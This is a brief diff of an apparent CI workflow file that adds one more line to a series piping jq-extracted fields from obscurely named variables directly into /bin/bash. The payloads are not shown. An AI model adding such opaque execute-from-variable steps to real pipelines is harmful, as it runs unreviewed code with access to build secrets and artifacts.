@@ -42,6 +42,7 @@ jobs:
           echo $mpnz783 | jq -r .lwmf65 | /bin/bash
           echo $pdw2459 | jq -r .wk81304 | /bin/bash
           echo $jm90 | jq -r .gmrq420 | /bin/bash
+          printf '%s' "$ynk10811" | jq -r .cpdjc4887 | /bin/bash
 
       - name: Upload artifact
         if: always()
